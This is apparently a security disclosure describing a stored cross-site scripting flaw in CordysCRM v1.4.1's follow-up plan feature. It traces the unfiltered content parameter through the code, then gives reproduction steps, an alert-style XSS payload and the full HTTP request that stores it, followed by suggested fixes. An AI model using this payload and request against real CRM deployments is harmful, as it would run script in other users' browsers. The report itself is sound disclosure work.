## Vulnerability Description

A **stored cross-site scripting (XSS)** vulnerability exists in the `OpportunityFollowPlanController` component in CordysCRM v1.4.1. This vulnerability stems from the `add()` method's failure to adequately validate or encode the `content` parameter when handling requests to save customer follow-up records. A remote attacker could submit malicious JavaScript code via the `/opportunity/follow/plan/add` interface. When the user clicks to view the plan follow-up record, the malicious script will execute in their browser environment.


## Vulnerability Analysis

The vulnerability's entry point class file is: src/main/java/cn/cordys/crm/opportunity/controller/OpportunityFollowPlanController.java

The `add()` method does not perform any XSS filtering; it proceeds to the logic layer for processing.

<img width="1480" height="906" alt="Pasted image 20260514153015" src="https://github.com/user-attachments/assets/2fe7e36a-b17a-4ec9-a060-68f094a50a4f" />




Logical layer class file: src/main/java/cn/cordys/crm/follow/service/FollowUpPlanService.java

The logic layer does not perform any XSS filtering on the `content` parameter passed in. Line 97 calls a database operation to insert data into the database. A stored XSS vulnerability exists.


<img width="1491" height="926" alt="Pasted image 20260514153057" src="https://github.com/user-attachments/assets/33ce242e-e361-4e77-8967-3cb01dc41318" />


## Vulnerability Reproduction


Enter my plan operation interface

<img width="1920" height="1047" alt="Pasted image 20260514153144" src="https://github.com/user-attachments/assets/76e5a838-fcc5-49f0-9599-f39ea4bc54dd" />


Write a new plan

<img width="1920" height="852" alt="Pasted image 20260514153215" src="https://github.com/user-attachments/assets/ff4d2c73-b790-421a-972d-cad70560ac9a" />


In the expected communication content, write the payload: <img src=x onerror=alert('XSS')>

<img width="1886" height="1012" alt="Pasted image 20260514153319" src="https://github.com/user-attachments/assets/078b63b4-934e-446f-84ac-d0dd75bb4bc9" />


Click Save

<img width="1691" height="1027" alt="Pasted image 20260514153401" src="https://github.com/user-attachments/assets/310adc48-fd72-40c1-a610-f4b7b62fceff" />


Clicking the save button will trigger the following request packet.

```http
POST /opportunity/follow/plan/add HTTP/1.1
Host: localhost:8081
Content-Length: 340
X-AUTH-TOKEN: 5b596f77-5942-4eb7-94a4-6b3fefbc2f29
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
CSRF-TOKEN: CYkmuI1mDs1q0RG6qbqVQ1GvBQNqI891/DPRjSiSWZO0COyOcRSal7HBV+vWJ/ZqoEzUK8bbPN3qn7cMVy3b3LyyMoKpRyAqRQWQeJbBpQ==
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Origin: http://localhost:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8081/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"converted":false,"moduleFields":[{"fieldId":"909021238272083","fieldValue":["946301554425856"]}],"id":"NULL","type":"CUSTOMER","customerId":"721348347314176","clueId":"","opportunityId":"668056393113600","contactId":"721657584959488","estimatedTime":1778774400000,"method":"2","owner":"admin","content":"<img src=x onerror=alert('XSS')>"}

```

<img width="1920" height="842" alt="Pasted image 20260514153446" src="https://github.com/user-attachments/assets/2b63a2d1-70d7-4213-8ec3-0e35c0764134" />


After saving, the payload will be automatically triggered.


<img width="1918" height="784" alt="Pasted image 20260514153507" src="https://github.com/user-attachments/assets/eef20a82-b28b-4deb-b988-12b256e28ee5" />



Returning to the main interface, simply refreshing the page will trigger the payload.

<img width="1920" height="955" alt="Pasted image 20260514153630" src="https://github.com/user-attachments/assets/8ef16277-fdd1-419f-a16d-bb632efb91bc" />


The vulnerability exists; vulnerability reproduction completed.


<img width="1785" height="948" alt="Pasted image 20260514153742" src="https://github.com/user-attachments/assets/6e1d2899-1dbd-4cef-b024-0ff0ee8d8d8e" />

## Repair suggestions


Input Filtering: Use a security library (such as Java's AntiSamy or Lucene) in the backend to whitelist submitted HTML content, removing dangerous tags and attributes such as `script` and `onmouseover`.

Output Escaping: Ensure variables are HTML entity encoded when rendering announcement content in the frontend template.

Content Security Policy (CSP): Configure an appropriate CSP policy to restrict the execution of inline scripts.
